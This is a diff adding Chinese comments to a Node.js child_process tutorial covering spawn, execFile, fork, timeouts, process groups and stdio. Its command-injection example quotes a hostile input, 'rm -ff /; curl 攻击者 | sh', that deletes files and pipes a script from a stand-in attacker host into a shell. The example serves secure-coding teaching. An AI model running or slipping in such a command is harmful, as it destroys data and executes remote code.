@@ -16,16 +16,17 @@
 共同点：都返回一个 `ChildProcess`，它是 **EventEmitter**（`'spawn'`/`'exit'`/`'close'`/`'error'`/`'message'`，呼应 node-events），`stdio` 是三个流（0/1/2，呼应 node-streams）。
 
 ```js
+// 目的：spawn 流式读外部命令输出；execFile 缓冲后 error-first 回调
 import { spawn, execFile, fork } from "node:child_process";
 
-const ls = spawn("ls", ["-la"]);
+const ls = spawn("ls", ["-la"]);                    // 不开 shell，参数直接传给 ls
 ls.stdout.on("data", (c) => process.stdout.write(c));   // 流式，边出边处理
 ls.stderr.on("data", (c) => process.stderr.write(c));
-ls.on("close", (code) => console.log("退出码", code));
+ls.on("close", (code) => console.log("退出码", code));    // code=0 表示成功
 
 execFile("git", ["rev-parse", "HEAD"], (err, stdout, stderr) => {   // 缓冲，error-first（呼应 node-async-errors）
-  if (err) throw err;                 // err.code/killed/signal 都在
-  console.log(stdout.trim());
+  if (err) throw err;                 // 非零退出/被杀时 err 携带 err.code/killed/signal
+  console.log(stdout.trim());         // ✓ 成功时 stdout 是当前 commit 哈希
 });
 ```
 
@@ -37,10 +38,11 @@ execFile("git", ["rev-parse", "HEAD"], (err, stdout, stderr) => {   // 缓冲，
 - **命令注入**：把用户输入拼进 `exec` 的命令串是**高危漏洞**：
 
 ```js
+// 目的：命令注入——把不可信输入拼进 exec 的命令串会被 shell 当代码执行
 // ❌ 灾难：用户输入 rm -ff /; curl 攻击者 | sh
-exec(`convert ${userFile} out.png`);
+exec(`convert ${userFile} out.png`);   // 分号后的内容会被 shell 另起一条命令执行（RCE）
 // ✅ 用 execFile + 数组参数，不经过 shell，输入只当"文件名"
-execFile("convert", [userFile, "out.png"], cb);
+execFile("convert", [userFile, "out.png"], cb);   // userFile 无论含什么特殊字符都只是一整个参数
 ```
 
 - `spawn` 默认**不开 shell**；若确需 shell（Windows 跑 `.bat` 等）传 `{ shell: true }`，此时**同样要防注入**（别把不可信输入拼进命令串）。
@@ -66,14 +68,15 @@ child.on("exit", (code, signal) => {
 ## 四、生命周期控制：kill、timeout、detached
 
 ```js
-const child = spawn("slow-tool", { timeout: 5000 });   // 超时自动 SIGTERM
-child.on("exit", (code, signal) => signal === "SIGTERM" && console.log("超时被终止"));
+// 目的：生命周期控制——超时自动杀、主动 kill、脱离父进程独立存活
+const child = spawn("slow-tool", { timeout: 5000 });   // 超 5s 自动发 SIGTERM
+child.on("exit", (code, signal) => signal === "SIGTERM" && console.log("超时被终止"));  // code=null, signal='SIGTERM'
 
 // 主动杀：
-child.kill("SIGTERM");     // 温和；需要更强可 SIGKILL（不给清理机会）
+child.kill("SIGTERM");     // 温和（给清理机会）；需要更强可 SIGKILL（不给清理机会）
 
 // 脱离父进程、独立存活（守护式）：
-spawn("nohup-task", { detached: true, stdio: "ignore" }).unref();
+spawn("nohup-task", { detached: true, stdio: "ignore" }).unref();  // unref 让父不等它就能退出
 ```
 
 **孤儿进程陷阱**：`child.kill()` 只杀**直接子进程**，若它又起了孙进程（尤其 `shell:true` 时 shell 是子、真命令是孙），孙进程可能存活。彻底清理要用**进程组**（`detached:true` 起新组，再 `process.kill(-pid)` 杀整组）——容器里"僵尸进程占内存"常见根因（呼应 node-deploy-perf 信号处理）。
@@ -86,14 +89,15 @@ spawn("nohup-task", { detached: true, stdio: "ignore" }).unref();
 
 ```js
 // parent.js
+// 目的：fork 启动一个 Node 子进程，用 send/'message' 双向传可克隆的值
 import { fork } from "node:child_process";
-const w = fork("./worker.js");
-w.send({ task: "sum", n: 1e7 });
-w.on("message", (r) => { console.log("子进程结果", r); w.kill(); });
+const w = fork("./worker.js");           // 自动建立 IPC 通道
+w.send({ task: "sum", n: 1e7 });         // 把任务发给子进程
+w.on("message", (r) => { console.log("子进程结果", r); w.kill(); });  // 收到结果后收尾
 
 // worker.js
 process.on("message", (msg) => {
-  let s = 0; for (let i = 0; i < msg.n; i++) s += i;
+  let s = 0; for (let i = 0; i < msg.n; i++) s += i;   // 干重活（在子进程自己的堆/线程上）
   process.send({ result: s });          // 回传给父
 });
 ```
@@ -108,12 +112,13 @@ process.on("message", (msg) => {
 `spawn` 的 `stdio` 选项决定三个描述符怎么接：`'pipe'`（默认，父子间管道）/`'inherit'`（共享父的，直接透传到终端）/`'ignore'`/文件 fd/另一个流。
 
 ```js
+// 目的：用 stdio 选项把子进程接进本进程的流世界（透传/喂 stdin）
 // 把子进程 stdout 直接接到本进程 stdout（像 shell 管道）
-spawn("ls", { stdio: "inherit" });
+spawn("ls", { stdio: "inherit" });    // 输出直接落到当前终端，不经管道
 
 // 给子进程喂 stdin（Writable 流，呼应 node-streams）
 const cat = spawn("cat");
-cat.stdin.end("hello from parent\n");
+cat.stdin.end("hello from parent\n");   // cat 会把这行原样打到它的 stdout
 ```
 
 `child.stdout` 是 Readable，可 `pipeline(child.stdout, fs.createWriteStream('log'))`（呼应 node-stream-pipeline）——"命令输出的流式落盘/过滤"。
